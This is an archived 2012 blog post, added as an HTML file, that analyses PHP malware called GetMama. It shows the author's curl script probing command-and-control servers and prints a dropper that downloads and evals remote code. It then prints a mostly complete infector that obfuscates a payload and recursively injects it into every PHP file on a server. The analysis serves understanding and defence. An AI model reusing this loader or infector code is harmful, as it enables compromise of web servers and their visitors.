@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deeper into the rabbit hole. The infinite-layer malware</title>
+    <meta name="Description" content="Rambling writings of a guy in tech.">
+    <link rel="stylesheet" href="/css/index.css">
+    <link rel="stylesheet" href="/css/prism-base16-monokai.dark.css">
+    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="Poorcode - A blog (sometimes) about code">
+  </head>
+  <body>
+    <header>
+      <h1 class="home"><a href="/">Poorcode - A blog (sometimes) about code</a></h1>
+      <ul class="nav"><li class="nav-item"><a href="/">Home</a></li>
+<li class="nav-item"><a href="/about/">About Me</a></li>
+<li class="nav-item"><a href="/posts/">Archive</a></li>
+<li class="nav-item"><a href="/old-stuff/">Old Stuff</a></li></ul>
+    </header>
+
+    <main class="tmpl-post">
+      <div class="warning">
+    <h2>This is a very old post</h2>
+    <p>This was originally published on 16 Apr 2012</p>
+    <p>I'm keeping these here mainly for nostalgic reasons. This post was writen years ago and
+    it's very likely you'll find it:</p>
+    <ol>
+    <li>Annoying (sorry, I was young)</li>
+    <li>Incorrect (sorry, I didn't know better)</li>
+    <li>Outdated (again, this is <em>old</em>)</li>
+    <li>All of the above</li>
+    </ol>
+    <p>So, basically, proceed at your own risk.</p>
+</div>
+
+<h1>Deeper into the rabbit hole. The infinite-layer malware</h1>
+
+<h2 id="about">About <a class="direct-link" href="#about">#</a></h2>
+<p>In my last post I went through an analysis of a PHP malware that we identified by the name of GetMama. The study demonstrated that the software was completely dependent on remote instructions given by a C&amp;C server queried from the injected code.</p>
+<p>After a brief study of those C&amp;C IPs I found that they were all nginx servers, running what appeared to be default just-installed pages with no content. But a commenter on <em>reddit</em> hinted me to try again those requests somehow faking them so they looked like requests from the actual malware. And so I did.</p>
+<h2 id="inspection">Inspection <a class="direct-link" href="#inspection">#</a></h2>
+<p>In order to protect myself I executed all queries through the Tor network. To do so, I wrote a small script that went through all the IPs I collected and did the same request the malware did.</p>
+<pre><code># We can give a specific IP. If not it gets a list from a file
+if [ -z $3 ]; then
+	cat cncs/ips | while read line; do
+		url=&quot;http://$line/jedi.php?version=$2&amp;mother=$1&amp;file=index.php&amp;host=$1&amp;ip=&amp;ref=&amp;ua=&amp;qs=&quot;;
+		proxychains4 curl $url;
+	done
+else
+	url=&quot;http://$3/jedi.php?version=$2&amp;mother=$1&amp;file=index.php&amp;host=$1&amp;ip=&amp;ref=&amp;ua=&amp;qs=&quot;;
+	proxychains4 curl $url;
+fi
+# Usage: ./request.sh DOMAIN VERSION [IP]
+</code></pre>
+<p>The script resulted in all the servers responding perfectly, so we can asset that they're still compromised as of this date. The unanimous response was the string <em>ebna</em>. As we saw in the last article, this means a client-side attack. Strangely enough, there was no actual Javascript payload attached to that <em>ebna</em> keyword, therefore the attack seemed to do nothing.</p>
+<p><em>Note: After some googling, looks like other people found out that tho C&amp;C only server the payload once a day per IP, and only to Windows hosts. I tried again forcing a IE6 User-Agent, but didn't get any response either. Most likely all Tor exit nodes have been tagged already today.</em></p>
+<p><em>Further note: I tried it without Tor (so brave). Seems like it might check that the request is actually being sent from an infected server that the C&amp;C keeps track of. Will try to circumvent this somewhow</em></p>
+<h2 id="we-need-to-go-deeper">We need to go deeper <a class="direct-link" href="#we-need-to-go-deeper">#</a></h2>
+<p>I thought then I could try altering the <em>version</em> parameter on the request to something different to what I found in the script. I set up a loop running from version 0 to 2000 and went to have lunch.  When I came back, most of them had returned the same: another PHP script.</p>
+<pre><code>eval $try= true;
+if( function_exists(&quot;curl_init&quot;) ){
+    $ch = curl_init('http://SOME_DOMAIN.com/101.txt');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+    $ult = trim(curl_exec($ch));
+    $try = false;
+}
+
+if ((ini_get('allow_url_fopen')) &amp;&amp; $try) {
+    $ult = trim(@file_get_contents('http://SOME_DOMAIN.com/101.txt'));
+    $try = false;
+}
+
+if($try){
+    $fp = fsockopen('SOME_DOMAIN.com', 80, $errno, $errstr, 30);
+    if ($fp) {
+        $out = &quot;GET /101.txt HTTP/1.0\r\n&quot;;
+        $out .= &quot;Host: SOME_DOMAIN.com\r\n&quot;;
+        $out .= &quot;Connection: Close\r\n\r\n&quot;;
+        fwrite($fp, $out);
+        $ret = '';
+        while (!feof($fp)) {
+            $ret  .=  fgets($fp, 128);
+        }
+        fclose($fp);
+        $ult = trim(substr($ret, strpos($ret, &quot;\r\n\r\n&quot;) + 4));
+    }
+}
+$xx = 'ev'.'al';
+$_FILE = create_function('$_',$xx.'($_);');  $_FILE($ult);%
+</code></pre>
+<p>As we can easily see, this script just tries several ways of retrieving <em>101.txt</em> from <em>SOME_DOMAIN.com</em> and then evaluates it. That domain seems to be an abandoned and spam-ridden Wordpress installation, the perfect target for setting up a distribution point for your payloads.  Again, I didn't publish it because this might be an innocent third party that I don't want blasted to oblivion :).</p>
+<h2 id="the-final-boss">The final boss <a class="direct-link" href="#the-final-boss">#</a></h2>
+<p>I went then to download all files from <em>0.txt</em> to <em>200.txt</em>. Most of them resulted in <em>404</em>s, except a few (namely 100,101,11,15 and 77). Let's work with 101.txt, the one involved in this specific attack. We will tackle it line-by-line and function-by-function.</p>
+<pre><code>set_time_limit(0);
+</code></pre>
+<p>This function just makes sure the execution doesn't time out. This starts well: having this here means that the script is going to do some serious work.</p>
+<pre><code>function get_file_extension($file_name) {
+    return substr(strrchr($file_name,'.'),1);
+}
+</code></pre>
+<p>Trivial helper function to get the extension of a file.</p>
+<pre><code>function pass_gen($dol) {
+	$source[0] = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+	$source[1] = &quot;0123456789&quot;;
+	$length = rand(5,50);
+	$passwordlen=intval($length)-1;
+	$use = implode(&quot;&quot;,$source);
+	$max_num=strlen($use)-1;
+	$rp='';
+	for($i=0;$i&lt;$passwordlen;$i++) {
+        $x=rand(0,$max_num);
+        $rp.=$use[$x];
+	} if ($dol){
+        return '$' . $source[0][rand(0,strlen($source[0])-1)].$rp;
+	} else {
+        return  $source[0][rand(0,strlen($source[0])-1)].$rp;
+	}
+}
+</code></pre>
+<p>Now this starts to be interesting. This function generates those random variable names that we found in the last article. The <em>$dol</em> argument appends a dollar sing in front of the random string, so it can be used to refer to variables in PHP.</p>
+<pre><code>function GetMass($text,$code, $massname){
+	$a = str_split($text);
+	foreach($a as $b){
+        $evmas[] = ord($b) + $code;
+	}
+	$z = $massname . &quot;= array('&quot; . implode(&quot;','&quot;,$evmas) . &quot;');&quot;;
+	return $z;
+}
+</code></pre>
+<p>Another familiar function! You remember when, in the last post, a function generated function names by subtracting and appending the ASCII values of some characters? This function generates those arrays, given a <em>$code</em> value, the name of the final array <em>$massname</em> and the string to decompose, <em>$text</em>.</p>
+<p>We have a large function now. Taking it by parts, it starts with the definition, that accepts some string named <em>$code</em>.</p>
+<pre><code>function Codee($code){
+</code></pre>
+<p>Then a new function is defined inside a string variable, to be evaluated later. It looks like this, with comments added by me for clarity:</p>
+<pre><code>$coo = 'if (!function_exists(&quot;F1&quot;))
+{
+	function F1($v6,$v7)
+	{
+		$v8 = \'\';		# Ane empty string, with apostrophes escaped.
+		foreach($v6 as $v9)
+		{
+			$v8 .= chr($v9 - $v7);
+		}
+		return $v8;
+	}
+	$v1 = F1($mas1,$code1);
+	$v2 = F1($mas2,$code2);
+	$v3 = F1($mas3,$code3);
+	$v4 = $v2(\'$v5\',$v1.\'(\'.$v3.\'($v5));\');
+	$v4($v0);
+}';
+</code></pre>
+<p>As most of you easily will see, this isn't anything else than the decoding function that we found in the original malware, with the three function names (eval, base64_decode and create_function in our case) defined in the <em>$v1-3</em> variables, etcetera. We're starting to feel quite confident about this being the actual code that generates the whole malware.</p>
+<p>As expected, then the function generates all the random variables and replaces those easy to read <em>$vX</em> variables with big strings spawned from hell.</p>
+<pre><code>$f1 = pass_gen(false);
+$coo = str_replace('F1',$f1,$coo);
+$v1 = pass_gen(true);
+$coo = str_replace('$v1',$v1,$coo);
+$v2 = pass_gen(true);
+$coo = str_replace('$v2',$v2,$coo);
+$v3 = pass_gen(true);
+$coo = str_replace('$v3',$v3,$coo);
+$v4 = pass_gen(true);
+$coo = str_replace('$v4',$v4,$coo);
+$v5 = pass_gen(true);
+$coo = str_replace('$v5',$v5,$coo);
+$v6 = pass_gen(true);
+$coo = str_replace('$v6',$v6,$coo);
+$v7 = pass_gen(true);
+$coo = str_replace('$v7',$v7,$coo);
+$v8 = pass_gen(true);
+$coo = str_replace('$v8',$v8,$coo);
+$v9 = pass_gen(true);
+$coo = str_replace('$v9',$v9,$coo);
+$v0 = pass_gen(true);
+$coo = str_replace('$v0',$v0,$coo);
+$mas1 = pass_gen(true);
+$coo = str_replace('$mas1',$mas1,$coo);
+$mas2 = pass_gen(true);
+$coo = str_replace('$mas2',$mas2,$coo);
+$mas3 = pass_gen(true);
+$coo = str_replace('$mas3',$mas3,$coo);
+$code1 = rand(1000,10000);
+$coo = str_replace('$code1',$code1,$coo);
+$code2 = rand(1000,10000);
+$coo = str_replace('$code2',$code2,$coo);
+$code3 = rand(1000,10000);
+$coo = str_replace('$code3',$code3,$coo);
+</code></pre>
+<p>It also base64-encodes the <em>$code</em> and puts it into the decoder generator with another funny variable name. This will become the <em>$huge_string</em> we found. Codee function ends here.</p>
+<pre><code>for($i=0; $i&lt;3; $i++){
+    $code = base64_encode($code);
+    $code = 'eval(base64_decode(&quot;' .$code.'&quot;)); ';
+}
+$code = base64_encode($code);
+
+$z =  GetMass('eval',$code1,$mas1);
+$z .=  GetMass('create_function',$code2,$mas2);
+$z .=  GetMass('base64_decode',$code3,$mas3);
+$z .= $v0 . '=&quot;'.$code.'&quot;;';
+$z .= $coo;
+
+return $z;
+
+}
+</code></pre>
+<p>But the obfuscation isn't done yet. Another function is defined. It starts with</p>
+<pre><code>function modify($fname)
+{
+	$tmp = file_get_contents($fname);
+	$md_start = md5($tmp);
+	chmod($fname,0666);
+	$md = md5($fname);
+	$pattern = '/function GetMama\(\).*\]\}\)\)\{break;\}\}/i';
+	$replacement = '';
+	$tmp = preg_replace($pattern, $replacement, $tmp);
+	$pattern = '/\/\*god_mode_on.*god_mode_off\*\//i';
+	$replacement = '';
+	$tmp = preg_replace($pattern, $replacement, $tmp);
+	$pattern = '/\/\*'.$md.'_on.*'.$md.'_off\*\//i';
+	$replacement = '';
+	$tmp = preg_replace($pattern, $replacement, $tmp);
+	$pattern = '/&lt;\?php[\s]*\?&gt;/i';
+	$replacement = '';
+	$tmp = preg_replace($pattern, $replacement, $tmp);
+</code></pre>
+<p>As we can see, the function loads a file and does some replacements depending on the structure of the file. It looks like that the four structures detected are either the GetMama function, a comment pair stating <em>god_mode_on</em> and <em>god_mode_off</em> (interestingly, this was present in another file in the same infected server), the class of comments I found in the script (so <em>that</em> is what that comment pair was!) and a straight-away php-tag pair.</p>
+<p>All the replacements are, by default, with an empty string, so this snippet just deletes what it finds.  Now the function continues.</p>
+<pre><code>$pos = strpos($tmp,'GetMama');
+$pos2 = strpos($tmp,'god_mode_on');
+if (($pos === false) &amp;&amp; ($pos2 === false))
+{
+	$code_t = 'THE EXACT PAYLOAD CODE WE GOT IN THE FIRST ARTICLE';
+	$mama = 'wtf';
+	$mama = $_SERVER[&quot;HTTP_HOST&quot;];
+	$code_t = str_replace('###',$mama,$code_t);
+	$code = '&lt;' . '?php ';
+</code></pre>
+<p>The script looks for either GetMama or god_mode_on in the loaded file. I dont really know why, because it was just deleted with those regexes before. Still the author things that this is <em>wtf-worthy</em> for a split second before <em>$mama</em> gets set to the current host. The host gets injected into <em>$code_t</em>, which was the exact payload we analized in the last article but with the host replaced with ###. A new variable, <em>$code</em>, gets set to an opening php tag. Now comes something interesting:</p>
+<pre><code>	$prob = rand(5,500);
+	for($i=0; $i&lt;700 + $prob; $i++)
+	{
+		$code = $code .' ';
+	}
+</code></pre>
+<p>You saw that?. The whole PHP gets padded a random number of spaces. Maybe some sort of detection avoidance? I supose at least this changes the md5 calculated before...</p>
+<pre><code>	$code_t = Codee($code_t);
+	$code = $code .'/*'.$md.'_on*/ '. $code_t .' /*'.$md.'_off*/'.' ?&gt;' . $tmp;
+	$f = fopen($fname,&quot;w&quot;);
+	fputs($f,$code);
+	fclose($f);
+}
+
+chmod($fname,0644);
+}
+</code></pre>
+<p>The function ends inserting a pair of comments containing the md5 hash of the file, the obfuscated full code generated by Codee and the ending php tag. It's then saved to the provided file and closed.</p>
+<p>Now we get to this function, called <em>dir_num</em>. Doesn't look that dangerous, that name, does it? Well, turns out that it is. The code is:</p>
+<pre><code>function dir_num($dir)
+{
+	global $fileslist;
+	static $deep = 0;
+	$odir = @opendir($dir);
+	while (($file = @readdir($odir)) !== FALSE)
+	{
+		if ($file == '.' || $file == '..')
+		{
+			continue;
+		}
+		else
+		{
+			echo '. ';
+			if(get_file_extension($file) == 'php')
+			{
+				modify($dir.DIRECTORY_SEPARATOR.$file);
+			}
+		}
+		if (is_dir($dir.DIRECTORY_SEPARATOR.$file))
+		{
+			$deep ++;
+			dir_num($dir.DIRECTORY_SEPARATOR.$file);
+			$deep --;
+		}
+	}
+	@closedir($odir);
+}
+</code></pre>
+<p>As you can read, this is a cute recursive function that crawls a given <em>$dir</em>ectory and modifies all the PHP files that it can find, injecting the malicious code that was built above. The <em>$deep</em> variable isn't used at any point, so probably this is a leftover from some old-school printf-debugging.</p>
+<p>Bad coder! Bad!</p>
+<p>The script then ends executing all the above-defined things in five lines, including a nice message and a reload.</p>
+<pre><code>Echo 'Wait please...&lt;br&gt;';
+$dir = dirname(__FILE__);
+dir_num($dir);
+echo '&lt;script&gt;window.location.reload();&lt;/script&gt;';
+exit();
+</code></pre>
+<h2 id="conclusions">Conclusions <a class="direct-link" href="#conclusions">#</a></h2>
+<p>Tadaa! And that's how it goes. The attacker finds a vulnerability that allows arbitrary php execution in a server.  Then he or she executes this file using that vulnerability, which in turn infects all the other PHP files with the GetMama malware. Then the GetMama receives instructions, one of them possible being loading this file again to infect even more PHP files, for example. And the infection goes on.</p>
+<p>I'm still interested in catching a client-side JS payload. That would be very interesting as JS malware is nowadays one of the most widespread forms of attack.</p>
+<p>I also will mention that besides <em>101.txt</em> I found, as I stated before, several other. Some contained the same exact code. But some other were really interesting, including a seemingly earlier version of this one with less obfuscation, a very simple wp-admin (from Wordpress) remote injection shell and, most interestingly, what at first glance (literally) looks like a sophisticated Windows exploit with full-blown shell and database access. This one in particular is quite some sensitive material. I'll dedicate some time to it and work out what and how it works and try publishing another analisys with the results.</p>
+<p>I hope you had fun reading this. Ill keep updating the blog with whatever I find. Chech the link at the bottom of the page to subscribe to the Atom feed or follow me at twitter.</p>
+
+
+<p><a href="/">← Home</a></p>
+
+    </main>
+
+    <footer></footer>
+
+    <!-- Current page: /old-stuff/getmama2/ -->
+  </body>
+</html>
